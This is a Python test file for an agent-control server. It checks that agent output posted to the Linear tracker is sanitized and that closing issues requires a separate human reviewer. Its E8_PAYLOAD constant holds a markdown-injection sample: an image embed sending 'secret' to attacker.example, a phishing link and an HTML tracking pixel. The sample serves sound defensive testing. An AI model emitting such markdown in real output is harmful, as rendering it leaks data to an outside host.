"""Write-back and the review gate, asserted through the API. Plan 5.6 and 5.7.

The properties under test are mostly refusals and absences, because that is
what the design is made of. The escape is proven against the exact payload E8
names: a closing fence, an image embed, a markdown link and raw HTML, none of
which may survive sanitization. The accept path is proven to refuse the
credential that ran the work, a digest that moved, an issue that left its
scope, and a deployment whose write flag is off. And the task itself is proven
to stay ``completed`` whatever happens to its proposal, because "the agent is
done" and "the tracker was changed" must never become one fact.

Linear is a fake object behind the ``LinearWritebackClient`` protocol, injected
through the FastAPI dependency, so every test asserts what would have been
written without a network in sight.
"""

from __future__ import annotations

import re
import uuid
from pathlib import Path
from typing import Any

import pytest
from agent_control_models.controls import ControlMatch, EvaluatorResult
from fastapi.testclient import TestClient
from sqlalchemy import text

from agent_control_server.config import dispatch_settings, linear_settings
from agent_control_server.services import agent_task_writeback_queue
from agent_control_server.services.linear_client import LinearError
from agent_control_server.services.linear_writeback import (
    CompletedStateResolver,
    IssueReviewState,
    decision_digest,
)
from agent_control_server.services.linear_writeback_compose import (
    comment_marker,
    compose_comment_body,
    sanitize_agent_text,
)
from agent_control_server.services.linear_writeback_runtime import (
    WritebackRuntime,
    get_writeback_runtime,
)

from .conftest import TEST_ADMIN_API_KEY, TEST_API_KEY

REPO_ROOT = Path(__file__).resolve().parents[2]
TASKS_URL = "/api/v1/agent-tasks"
STEP_AGENT = "reviewer_agent"

E8_PAYLOAD = (
    "All done.\n"
    "```\n"
    "![](https://attacker.example/exfil?d=secret)\n"
    "[click me](https://attacker.example/phish)\n"
    '<img src="https://attacker.example/pixel">\n'
)


# ---------------------------------------------------------------------------
# The escape, against the E8 payload
# ---------------------------------------------------------------------------


def test_sanitize_leaves_none_of_the_e8_constructs_standing() -> None:
    """A closing fence, an image, a link and raw HTML all come out inert."""
    out = sanitize_agent_text(E8_PAYLOAD)

    assert re.search(r"`{3,}", out) is None, "a backtick run of 3+ survived"
    assert "![" not in out, "image syntax survived"
    assert re.search(r"(?<!\\)\[", out) is None, "an unescaped [ survived"
    assert re.search(r"(?<!\\)<", out) is None, "an unescaped < survived"


def test_sanitized_urls_become_inert_code_spans() -> None:
    out = sanitize_agent_text("see https://example.com/a and http://other.example/b")

    assert "`https://example.com/a`" in out
    assert "`http://other.example/b`" in out


def test_sanitize_neutralizes_mentions() -> None:
    out = sanitize_agent_text("ping @alice about this")

    assert "@alice" not in out
    assert "`@`alice" in out


def test_sanitize_caps_the_body_at_4000_characters_of_input() -> None:
    out = sanitize_agent_text("x" * 5000)

    assert "[output truncated by agent control]" in out
    # The cap applies to the input; the escape may lengthen it slightly.
    assert len(out) < 4100


def test_composed_comment_keeps_the_fence_closed_around_the_payload() -> None:
    """Every line of the agent block stays quoted and no line can close it."""
    body = compose_comment_body(
        task_key="a" * 32,
        step_index=0,
        total_steps=2,
        agent_name="researcher",
        output_text=E8_PAYLOAD,
    )
    lines = body.split("\n")
    open_fence = lines.index("> ```")
    close_fence = len(lines) - 1 - lines[::-1].index("> ```")

    assert comment_marker("a" * 32, 0) == lines[0]
    assert "Written by an agent, not reviewed by a human." in lines[1]
    for line in lines[open_fence + 1 : close_fence]:
        assert line.startswith("> ")
        assert re.search(r"`{3,}", line) is None


def test_composed_comment_has_no_chain_link_without_a_console_url(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(linear_settings, "console_base_url", "")
    body = compose_comment_body(
        task_key="a" * 32, step_index=0, total_steps=1, agent_name="a", output_text="hi"
    )
    assert "[Chain](" not in body

    monkeypatch.setattr(linear_settings, "console_base_url", "https://console.example")
    body = compose_comment_body(
        task_key="a" * 32, step_index=0, total_steps=1, agent_name="a", output_text="hi"
    )
    assert f"[Chain](https://console.example/agent-tasks/{'a' * 32})" in body


def test_decision_digest_moves_when_any_of_its_three_parts_move() -> None:
    base = decision_digest("text", "issue-1", "state-1")

    assert decision_digest("text2", "issue-1", "state-1") != base
    assert decision_digest("text", "issue-2", "state-1") != base
    assert decision_digest("text", "issue-1", "state-2") != base
    assert decision_digest("text", "issue-1", "state-1") == base
    assert base.startswith("sha256:")


# ---------------------------------------------------------------------------
# The deployment carries the flag, off
# ---------------------------------------------------------------------------


def test_the_write_flag_defaults_off_and_reaches_the_process() -> None:
    """A setting that exists and one that reaches the process are different
    things. The flag must default off, be passed through docker-compose.yml,
    and be documented in .env.example, all in the same change."""
    assert linear_settings.write_enabled is False
    assert dispatch_settings.review_stale_after_hours == 48

    compose = (REPO_ROOT / "docker-compose.yml").read_text()
    assert "AGENT_CONTROL_LINEAR_WRITE_ENABLED" in compose
    assert "${AGENT_CONTROL_LINEAR_WRITE_ENABLED:-false}" in compose

    env_example = (REPO_ROOT / "server" / ".env.example").read_text()
    assert "AGENT_CONTROL_LINEAR_WRITE_ENABLED" in env_example
    assert "AGENT_CONTROL_DISPATCH_REVIEW_STALE_AFTER_HOURS" in env_example


# ---------------------------------------------------------------------------
# Fake Linear, injected through the dependency
# ---------------------------------------------------------------------------


class FakeWritebackClient:
    """In-memory :class:`LinearWritebackClient`."""

    def __init__(self) -> None:
        self.comments: list[tuple[str, str]] = []
        self.preseeded_markers: set[str] = set()
        self.state_updates: list[tuple[str, str]] = []
        self.completed_state_id = "state-done"
        self.issues: dict[str, IssueReviewState] = {}
        self.fail_reads = False

    def issue(self, ref: str, **overrides: Any) -> IssueReviewState:
        state = IssueReviewState(
            ref=ref,
            identifier="OPS-9",
            title="A queued issue",
            state_id="state-backlog",
            state_name="Backlog",
            state_type="backlog",
            team_key="OPS",
            milestone_id="milestone-1",
        )
        state = IssueReviewState(**{**state.__dict__, **overrides})
        self.issues[ref] = state
        return state

    async def create_comment(self, *, issue_id: str, body: str) -> str:
        self.comments.append((issue_id, body))
        return f"comment-{len(self.comments)}"

    async def issue_has_marker(self, *, issue_id: str, marker: str) -> bool:
        if marker in self.preseeded_markers:
            return True
        # First-line equality, mirroring HttpLinearWritebackClient.
        return any(
            ref == issue_id and body.split("\n", 1)[0].strip() == marker
            for ref, body in self.comments
        )

    async def update_issue_state(self, *, issue_id: str, state_id: str) -> None:
        self.state_updates.append((issue_id, state_id))

    async def fetch_completed_state_id(self, *, team_key: str) -> str:
        return self.completed_state_id

    async def fetch_issue_review_state(self, *, issue_id: str) -> IssueReviewState:
        if self.fail_reads:
            raise LinearError("Linear could not be reached.")
        if issue_id not in self.issues:
            self.issue(issue_id)
        return self.issues[issue_id]

    async def aclose(self) -> None:
        pass


@pytest.fixture()
def fake_linear(app: Any):
    """Enable write-back against a fake Linear for the duration of one test."""
    fake = FakeWritebackClient()
    runtime = WritebackRuntime(
        client=fake, resolver=CompletedStateResolver(fake), write_enabled=True
    )
    app.dependency_overrides[get_writeback_runtime] = lambda: runtime
    yield fake
    app.dependency_overrides.pop(get_writeback_runtime, None)


@pytest.fixture()
def disabled_linear(app: Any):
    """A configured client with the write flag off: rows queue, nothing sends."""
    fake = FakeWritebackClient()
    runtime = WritebackRuntime(
        client=fake, resolver=CompletedStateResolver(fake), write_enabled=False
    )
    app.dependency_overrides[get_writeback_runtime] = lambda: runtime
    yield fake
    app.dependency_overrides.pop(get_writeback_runtime, None)


# ---------------------------------------------------------------------------
# Flow helpers
# ---------------------------------------------------------------------------


def _ref() -> str:
    return f"issue-{uuid.uuid4().hex[:12]}"


def _commit_linear(client: TestClient, ref: str, *, dry_run: bool = False) -> str:
    scope = {
        "kind": "items",
        "source_kind": "linear",
        "items": [{"source_ref": ref, "title": f"title for {ref}"}],
    }
    preview = client.post(
        f"{TASKS_URL}/import",
        json={"scope": scope, "mode": "preview", "dry_run": dry_run},
    )
    assert preview.status_code == 200, preview.text
    commit = client.post(
        f"{TASKS_URL}/import",
        json={
            "scope": scope,
            "mode": "commit",
            "dry_run": dry_run,
            "expected_refs_digest": preview.json()["refs_digest"],
        },
    )
    assert commit.status_code == 200, commit.text
    assert commit.json()["created"] == 1, commit.text
    return str(commit.json()["task_keys"][0])


def _run_to_completion(
    client: TestClient,
    task_key: str,
    *,
    output_text: str = "summary of what was done",
    instance: str = "inst-a",
) -> None:
    claimed = client.post(
        f"{TASKS_URL}/{task_key}/claim", json={"instance_id": instance}
    )
    assert claimed.status_code == 200, claimed.text
    started = client.post(
        f"{TASKS_URL}/{task_key}/steps",
        json={"instance_id": instance, "step_index": 0, "agent_name": STEP_AGENT},
    )
    assert started.status_code == 200, started.text
    finished = client.post(
        f"{TASKS_URL}/{task_key}/steps/0/finish",
        json={
            "instance_id": instance,
            "status": "completed",
            "output_text": output_text,
        },
    )
    assert finished.status_code == 200, finished.text
    done = client.post(
        f"{TASKS_URL}/{task_key}/finish",
        json={"instance_id": instance, "status": "completed"},
    )
    assert done.status_code == 200, done.text


def _writeback_rows(db_engine: Any, task_key: str) -> list[dict[str, Any]]:
    with db_engine.connect() as conn:
        rows = conn.execute(
            text(
                "SELECT w.kind, w.status, w.body, w.step_index, w.id "
                "FROM agent_task_writebacks w JOIN agent_tasks t ON t.id = w.task_id "
                "WHERE t.task_key = :key ORDER BY w.id"
            ),
            {"key": task_key},
        ).mappings()
        return [dict(row) for row in rows]


def _await_entry(client: TestClient, task_key: str) -> dict[str, Any]:
    response = client.get(f"{TASKS_URL}/review")
    assert response.status_code == 200, response.text
    for entry in response.json()["entries"]:
        if entry["task_key"] == task_key:
            return dict(entry)
    raise AssertionError(f"no review entry for {task_key}: {response.text}")


# ---------------------------------------------------------------------------
# Comments: queued beside the step, sent behind the flag
# ---------------------------------------------------------------------------


def test_a_completed_step_posts_its_comment_with_marker_and_attribution(
    client: TestClient, fake_linear: FakeWritebackClient, db_engine: Any
) -> None:
    ref = _ref()
    key = _commit_linear(client, ref)
    _run_to_completion(client, key, output_text=E8_PAYLOAD)

    assert len(fake_linear.comments) == 1
    issue_id, body = fake_linear.comments[0]
    assert issue_id == ref
    assert comment_marker(key, 0) in body
    assert "Written by an agent, not reviewed by a human." in body
    assert f"`{STEP_AGENT}`" in body
    assert "![" not in body, "the E8 payload reached Linear unescaped"

    rows = _writeback_rows(db_engine, key)
    comment_rows = [r for r in rows if r["kind"] == "comment"]
    assert [r["status"] for r in comment_rows] == ["sent"]


def test_with_the_flag_off_the_comment_queues_and_nothing_reaches_linear(
    client: TestClient, disabled_linear: FakeWritebackClient, db_engine: Any
) -> None:
    """The shipped default: the queue fills, the tracker is untouched."""
    key = _commit_linear(client, _ref())
    _run_to_completion(client, key)

    assert disabled_linear.comments == []
    rows = _writeback_rows(db_engine, key)
    comment_rows = [r for r in rows if r["kind"] == "comment"]
    assert [r["status"] for r in comment_rows] == ["pending"]


def test_an_existing_marker_suppresses_the_duplicate_post(
    client: TestClient, fake_linear: FakeWritebackClient, db_engine: Any
) -> None:
    ref = _ref()
    key = _commit_linear(client, ref)
    claimed = client.post(f"{TASKS_URL}/{key}/claim", json={"instance_id": "inst-a"})
    assert claimed.status_code == 200
    fake_linear.preseeded_markers.add(comment_marker(key, 0))

    started = client.post(
        f"{TASKS_URL}/{key}/steps",
        json={"instance_id": "inst-a", "step_index": 0, "agent_name": STEP_AGENT},
    )
    assert started.status_code == 200
    finished = client.post(
        f"{TASKS_URL}/{key}/steps/0/finish",
        json={"instance_id": "inst-a", "status": "completed", "output_text": "done"},
    )
    assert finished.status_code == 200, finished.text

    assert fake_linear.comments == [], "found means already written"
    rows = _writeback_rows(db_engine, key)
    assert [r["status"] for r in rows if r["kind"] == "comment"] == ["sent"]


def test_a_dry_run_task_writes_nothing_and_queues_nothing(
    client: TestClient, fake_linear: FakeWritebackClient, db_engine: Any
) -> None:
    """Mitigation 4: a dry run that still comments records work that never
    happened, which is worse than no dry run."""
    key = _commit_linear(client, _ref(), dry_run=True)
    _run_to_completion(client, key)

    assert fake_linear.comments == []
    assert _writeback_rows(db_engine, key) == []


def test_a_control_deny_is_terminal_and_posts_nothing(
    client: TestClient,
    fake_linear: FakeWritebackClient,
    db_engine: Any,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    deny = ControlMatch(
        control_id=1,
        control_name="no-writebacks",
        action="deny",
        result=EvaluatorResult(matched=True, confidence=1.0),
    )

    async def _denies(db: Any, *, namespace_key: str, agent_name: str, body: str):
        return False, [deny]

    monkeypatch.setattr(agent_task_writeback_queue, "evaluate_writeback_body", _denies)

    key = _commit_linear(client, _ref())
    _run_to_completion(client, key)

    assert fake_linear.comments == []
    rows = _writeback_rows(db_engine, key)
    assert [r["status"] for r in rows if r["kind"] == "comment"] == ["denied"]


def test_a_linear_failure_marks_the_row_failed_and_never_the_step(
    client: TestClient, fake_linear: FakeWritebackClient, db_engine: Any
) -> None:
    async def _boom(*, issue_id: str, body: str) -> str:
        raise LinearError("Linear reported an internal error.")

    fake_linear.create_comment = _boom  # type: ignore[method-assign]

    key = _commit_linear(client, _ref())
    _run_to_completion(client, key)

    rows = _writeback_rows(db_engine, key)
    comment_rows = [r for r in rows if r["kind"] == "comment"]
    assert [r["status"] for r in comment_rows] == ["failed"]
    task = client.get(f"{TASKS_URL}/{key}").json()["task"]
    assert task["status"] == "completed"
    assert task["steps"][0]["status"] == "completed"


# ---------------------------------------------------------------------------
# The proposal and the queue
# ---------------------------------------------------------------------------


def test_a_completed_task_leaves_a_waiting_proposal_and_stays_completed(
    client: TestClient, fake_linear: FakeWritebackClient, db_engine: Any
) -> None:
    key = _commit_linear(client, _ref())
    _run_to_completion(client, key, output_text="the final summary")

    rows = _writeback_rows(db_engine, key)
    proposals = [r for r in rows if r["kind"] == "status_change"]
    assert [r["status"] for r in proposals] == ["awaiting_approval"]
    assert proposals[0]["body"] == "the final summary"

    task = client.get(f"{TASKS_URL}/{key}").json()["task"]
    assert task["status"] == "completed", (
        "the task status is completed; awaiting_approval belongs to the row"
    )


def test_the_review_queue_shows_the_target_and_a_digest(
    client: TestClient, fake_linear: FakeWritebackClient
) -> None:
    ref = _ref()
    fake_linear.issue(ref, identifier="OPS-5", title="The real title")
    key = _commit_linear(client, ref)
    _run_to_completion(client, key, output_text="summary")

    entry = _await_entry(client, key)

    assert entry["issue"]["identifier"] == "OPS-5"
    assert entry["issue"]["title"] == "The real title"
    assert entry["agent_name"] == STEP_AGENT
    assert entry["summary"] == "summary"
    assert entry["stale"] is False
    assert entry["decision_digest"] == decision_digest(
        "summary", ref, fake_linear.completed_state_id
    )


def test_the_review_route_answers_empty_rather_than_matching_task_key(
    client: TestClient,
) -> None:
    response = client.get(f"{TASKS_URL}/review")

    assert response.status_code == 200, response.text
    assert response.json() == {"entries": [], "total": 0}


def test_a_failed_linear_read_renders_the_entry_with_no_digest(
    client: TestClient, fake_linear: FakeWritebackClient
) -> None:
    key = _commit_linear(client, _ref())
    _run_to_completion(client, key)
    fake_linear.fail_reads = True

    entry = _await_entry(client, key)

    assert entry["issue"]["read_failed"] is True
    assert entry["decision_digest"] is None


# ---------------------------------------------------------------------------
# Accept: the seven steps, mostly as refusals
# ---------------------------------------------------------------------------


def _accept(
    client: TestClient, task_key: str, entry: dict[str, Any], **overrides: Any
) -> Any:
    body = {
        "writeback_id": entry["writeback_id"],
        "expected_decision_digest": entry["decision_digest"],
    }
    body.update(overrides)
    return client.post(f"{TASKS_URL}/{task_key}/accept", json=body)


def test_accept_closes_the_issue_under_the_resolved_state(
    non_admin_client: TestClient,
    admin_client: TestClient,
    fake_linear: FakeWritebackClient,
) -> None:
    """The dispatcher's key runs the task; a different key accepts."""
    ref = _ref()
    key = _commit_linear(admin_client, ref)
    _run_to_completion(non_admin_client, key)
    entry = _await_entry(admin_client, key)

    response = _accept(admin_client, key, entry)

    assert response.status_code == 200, response.text
    payload = response.json()
    assert fake_linear.state_updates == [(ref, fake_linear.completed_state_id)]
    assert payload["writeback"]["status"] == "sent"
    assert payload["writeback"]["target_state_id"] == fake_linear.completed_state_id
    assert payload["note"] is None
    assert payload["task"]["status"] == "completed"


def test_accept_refuses_the_credential_that_claimed_the_task(
    non_admin_client: TestClient, admin_client: TestClient, fake_linear: FakeWritebackClient
) -> None:
    """The invariant: may run agents, may not accept their work."""
    key = _commit_linear(admin_client, _ref())
    _run_to_completion(non_admin_client, key)
    entry = _await_entry(admin_client, key)

    response = _accept(non_admin_client, key, entry)

    assert response.status_code == 409, response.text
    assert response.json()["error_code"] == "SELF_APPROVAL_REFUSED"
    assert fake_linear.state_updates == []


def test_accept_refuses_a_digest_that_moved_and_returns_the_current_one(
    non_admin_client: TestClient, admin_client: TestClient, fake_linear: FakeWritebackClient
) -> None:
    ref = _ref()
    key = _commit_linear(admin_client, ref)
    _run_to_completion(non_admin_client, key, output_text="summary")
    entry = _await_entry(admin_client, key)

    response = _accept(
        admin_client, key, entry, expected_decision_digest=f"sha256:{'0' * 64}"
    )

    assert response.status_code == 409, response.text
    body = response.json()
    assert body["error_code"] == "DECISION_CHANGED"
    assert fake_linear.state_updates == []


def test_accept_refuses_an_issue_that_left_its_team(
    non_admin_client: TestClient,
    admin_client: TestClient,
    fake_linear: FakeWritebackClient,
    db_engine: Any,
) -> None:
    ref = _ref()
    fake_linear.issue(ref, team_key="ENG")
    key = _commit_linear(admin_client, ref)
    with db_engine.begin() as conn:
        conn.execute(
            text("UPDATE agent_tasks SET source_team_key = 'OPS' WHERE task_key = :k"),
            {"k": key},
        )
    _run_to_completion(non_admin_client, key)
    entry = _await_entry(admin_client, key)

    response = _accept(admin_client, key, entry)

    assert response.status_code == 409, response.text
    assert response.json()["error_code"] == "SCOPE_CHANGED"
    assert fake_linear.state_updates == []


def test_accept_refuses_an_issue_that_left_its_milestone(
    non_admin_client: TestClient,
    admin_client: TestClient,
    fake_linear: FakeWritebackClient,
    db_engine: Any,
) -> None:
    ref = _ref()
    fake_linear.issue(ref, milestone_id="milestone-2")
    key = _commit_linear(admin_client, ref)
    with db_engine.begin() as conn:
        conn.execute(
            text(
                "UPDATE agent_tasks SET source_scope_kind = 'milestone', "
                "source_scope_ref = 'milestone-1' WHERE task_key = :k"
            ),
            {"k": key},
        )
    _run_to_completion(non_admin_client, key)
    entry = _await_entry(admin_client, key)

    response = _accept(admin_client, key, entry)

    assert response.status_code == 409, response.text
    assert response.json()["error_code"] == "SCOPE_CHANGED"


def test_accept_notes_already_completed_when_a_human_closed_it_first(
    non_admin_client: TestClient, admin_client: TestClient, fake_linear: FakeWritebackClient
) -> None:
    ref = _ref()
    key = _commit_linear(admin_client, ref)
    _run_to_completion(non_admin_client, key)
    entry = _await_entry(admin_client, key)
    fake_linear.issue(ref, state_type="completed", state_name="Done")

    response = _accept(admin_client, key, entry)

    assert response.status_code == 200, response.text
    assert response.json()["note"] == "ALREADY_COMPLETED"
    assert fake_linear.state_updates == [], "no second close was sent"
    assert response.json()["writeback"]["status"] == "sent"


def test_accept_refuses_while_the_write_flag_is_off(
    non_admin_client: TestClient,
    admin_client: TestClient,
    disabled_linear: FakeWritebackClient,
) -> None:
    ref = _ref()
    key = _commit_linear(admin_client, ref)
    _run_to_completion(non_admin_client, key)
    entry = _await_entry(admin_client, key)
    assert entry["decision_digest"] is not None, "the queue still renders"

    response = _accept(admin_client, key, entry)

    assert response.status_code == 409, response.text
    assert response.json()["error_code"] == "LINEAR_WRITE_DISABLED"
    assert disabled_linear.state_updates == []


def test_a_second_accept_conflicts_because_the_row_already_moved(
    non_admin_client: TestClient, admin_client: TestClient, fake_linear: FakeWritebackClient
) -> None:
    key = _commit_linear(admin_client, _ref())
    _run_to_completion(non_admin_client, key)
    entry = _await_entry(admin_client, key)
    assert _accept(admin_client, key, entry).status_code == 200

    response = _accept(admin_client, key, entry)

    assert response.status_code == 409, response.text
    assert response.json()["error_code"] == "TASK_STATUS_CONFLICT"
    assert len(fake_linear.state_updates) == 1


def test_accept_under_no_auth_provider_proceeds_because_nothing_has_an_identity(
    client: TestClient, fake_linear: FakeWritebackClient
) -> None:
    """With credential checks disabled every caller is anonymous, including the
    dispatcher, so the comparison cannot bind and is skipped rather than
    refusing every accept. The human press and the digest still gate."""
    from agent_control_server.auth_framework.core import set_authorizer
    from agent_control_server.auth_framework.providers.no_auth import NoAuthProvider

    set_authorizer(NoAuthProvider())
    unauthenticated = TestClient(client.app)

    key = _commit_linear(unauthenticated, _ref())
    _run_to_completion(unauthenticated, key)
    entry = _await_entry(unauthenticated, key)

    response = _accept(unauthenticated, key, entry)

    assert response.status_code == 200, response.text
    assert len(fake_linear.state_updates) == 1


# ---------------------------------------------------------------------------
# Reject
# ---------------------------------------------------------------------------


def test_reject_records_the_reason_and_the_issue_stays_open(
    non_admin_client: TestClient, admin_client: TestClient, fake_linear: FakeWritebackClient
) -> None:
    key = _commit_linear(admin_client, _ref())
    _run_to_completion(non_admin_client, key)
    entry = _await_entry(admin_client, key)

    response = admin_client.post(
        f"{TASKS_URL}/{key}/reject",
        json={"writeback_id": entry["writeback_id"], "reason": "not actually done"},
    )

    assert response.status_code == 200, response.text
    payload = response.json()
    assert payload["writeback"]["status"] == "rejected"
    assert payload["writeback"]["rejected_reason"] == "not actually done"
    assert payload["task"]["status"] == "completed"
    assert fake_linear.state_updates == []
    assert admin_client.get(f"{TASKS_URL}/review").json()["entries"] == []


def test_reject_works_with_the_write_flag_off(
    non_admin_client: TestClient,
    admin_client: TestClient,
    disabled_linear: FakeWritebackClient,
) -> None:
    """Declining needs no Linear write, so the flag does not gate it."""
    key = _commit_linear(admin_client, _ref())
    _run_to_completion(non_admin_client, key)
    entry = _await_entry(admin_client, key)

    response = admin_client.post(
        f"{TASKS_URL}/{key}/reject", json={"writeback_id": entry["writeback_id"]}
    )

    assert response.status_code == 200, response.text


def test_reject_refuses_the_credential_that_claimed_the_task(
    non_admin_client: TestClient, admin_client: TestClient, fake_linear: FakeWritebackClient
) -> None:
    """A dispatcher must not bury its own output before a human reads it."""
    key = _commit_linear(admin_client, _ref())
    _run_to_completion(non_admin_client, key)
    entry = _await_entry(admin_client, key)

    response = non_admin_client.post(
        f"{TASKS_URL}/{key}/reject", json={"writeback_id": entry["writeback_id"]}
    )

    assert response.status_code == 409, response.text
    assert response.json()["error_code"] == "SELF_APPROVAL_REFUSED"


def test_an_unknown_writeback_id_is_a_404(
    non_admin_client: TestClient, admin_client: TestClient, fake_linear: FakeWritebackClient
) -> None:
    key = _commit_linear(admin_client, _ref())
    _run_to_completion(non_admin_client, key)

    response = admin_client.post(
        f"{TASKS_URL}/{key}/accept",
        json={
            "writeback_id": 999999,
            "expected_decision_digest": f"sha256:{'0' * 64}",
        },
    )

    assert response.status_code == 404, response.text
    assert response.json()["error_code"] == "AGENT_TASK_WRITEBACK_NOT_FOUND"


def test_the_approve_operation_requires_a_credential(
    unauthenticated_client: TestClient, fake_linear: FakeWritebackClient
) -> None:
    response = unauthenticated_client.post(
        f"{TASKS_URL}/{'a' * 32}/accept",
        json={
            "writeback_id": 1,
            "expected_decision_digest": f"sha256:{'0' * 64}",
        },
    )

    assert response.status_code == 401, response.text


# ---------------------------------------------------------------------------
# Keys used by these tests really are distinct credentials
# ---------------------------------------------------------------------------


def test_the_two_test_keys_hash_differently() -> None:
    """The self-approval tests mean nothing if both clients hash the same."""
    from agent_control_server.services.caller_identity import hash_caller_id

    assert hash_caller_id(TEST_API_KEY[:8]) != hash_caller_id(TEST_ADMIN_API_KEY[:8])
